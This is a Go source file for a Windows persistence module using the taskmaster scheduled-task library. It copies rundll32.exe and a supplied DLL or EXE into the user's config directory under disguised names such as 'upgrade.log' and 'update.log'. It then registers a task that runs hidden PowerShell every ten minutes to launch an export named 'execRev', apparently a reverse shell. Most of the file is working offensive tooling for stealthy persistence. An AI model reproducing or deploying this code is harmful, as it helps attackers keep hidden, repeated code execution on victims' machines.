package persistance

import (
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/capnspacehook/taskmaster"
	"github.com/rickb777/date/period"
)

func GetCurrentUser(connection taskmaster.TaskService) {

	result := connection.GetConnectedUser()
	println("[+] User: ", result)
}

func ListAllTasks(connection taskmaster.TaskService) {

	collection, err := connection.GetRegisteredTasks()
	if err != nil {
		os.Exit(1)
	}

	for i := 0; i < len(collection); i++ {
		var name string = collection[i].Name
		var path string = collection[i].Path

		println("[+] Task:", name, " Path: ", path)
	}
	collection.Release()
}

func ListTask(connection taskmaster.TaskService, path_task string) {

	registerTask, err := connection.GetRegisteredTask(path_task)

	if err != nil {
		println(err.Error())
	}

	println("Task: ", registerTask.Name)

}

func FolderTask(connection taskmaster.TaskService, path_task string) {

	folderTask, err := connection.GetTaskFolder(path_task)

	if err != nil {
		println(err.Error())
	}
	println("[+] Folder Name: ", folderTask.Name)
	println("[+] Folder Path: ", folderTask.Path)
	println("[+] Subfolders: ", folderTask.SubFolders)
}
func getConfigDir() string {
	var path, err = os.UserConfigDir()
	if err != nil {
		println(err.Error())
	}
	return path
}
func copy(srcName string, dstName string) {
	bytesRead, err := ioutil.ReadFile(srcName)
	if err != nil {
		log.Fatal(err)
	}

	err = ioutil.WriteFile(dstName, bytesRead, 0755)
	if err != nil {
		log.Fatal(err)
	}
}
func copyDllExecutor() {
	var srcName string = `C:\Windows\System32\rundll32.exe`
	var dstName string = getConfigDir() + `\upgrade.log`
	copy(srcName, dstName)

}
func copyDllTrigger(path_dll string) {
	var srcName string = path_dll
	var dstName string = getConfigDir() + `\update.log`
	copy(srcName, dstName)
	//os.Remove(srcName)
}
func copyExeTrigger(exe_dll string) {
	var srcName string = exe_dll
	var dstName string = getConfigDir() + `\update.exe`
	copy(srcName, dstName)
	//os.Remove(srcName)
}
func CreateDllScheduledTask(connection taskmaster.TaskService, name_task string, path_dll string) {
	copyDllExecutor()
	copyDllTrigger(path_dll)
	var working_dir string = getConfigDir()
	var args string = `-W hidden -C "C:\Windows\System32\cmd.exe /c` + getConfigDir() + `\upgrade.log ` + getConfigDir() + `\update.log,execRev"`
	//var args string = `/c ` + getConfigDir() + `\upgrade.log ` + getConfigDir() + `\update.log,execRev`
	CreateScheduledTask(connection, name_task, working_dir, args)
}
func CreateExeScheduledTask(connection taskmaster.TaskService, name_task string, path_exe string) {
	copyExeTrigger(path_exe)
	var working_dir string = getConfigDir()
	var args string = `-W hidden -C "` + getConfigDir() + `\update.exe"`
	//var args string = `/c ` + getConfigDir() + `\update.exe`
	CreateScheduledTask(connection, name_task, working_dir, args)
}
func CreateScheduledTask(connection taskmaster.TaskService, name_task string, working_dir string, args string) {

	action := taskmaster.ExecAction{
		//Path:       `C:\Windows\System32\cmd.exe`,
		Path:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		WorkingDir: working_dir,
		Args:       args,
	}

	dailyTrigger := taskmaster.DailyTrigger{
		TaskTrigger: taskmaster.TaskTrigger{
			Enabled:       true,
			StartBoundary: time.Now().Add(5 * time.Minute),
			RepetitionPattern: taskmaster.RepetitionPattern{
				RepetitionDuration: period.New(0, 0, 100, 0, 0, 0),
				RepetitionInterval: period.NewHMS(0, 10, 0),
				StopAtDurationEnd:  false,
			},
		},
		DayInterval: taskmaster.EveryDay,
	}

	definition := connection.NewTaskDefinition()
	definition.AddTrigger(dailyTrigger)
	definition.AddAction(action)
	RegisteredTask, bool_result, err := connection.CreateTask(name_task, definition, true)

	if err != nil {
		println(err.Error())
		println(bool_result)
		println(RegisteredTask.Path)
	}
}

func DeleteScheduledTask(connection taskmaster.TaskService, path_task string) {
	err := connection.DeleteTask(path_task)
	if err != nil {
		println(err.Error())
	}
}

func GetConnection() taskmaster.TaskService {

	connection, err := taskmaster.Connect()

	if err != nil {
		os.Exit(1)
	}
	return connection

}

func DisconnectConnection(connection taskmaster.TaskService) {

	connection.Disconnect()

}
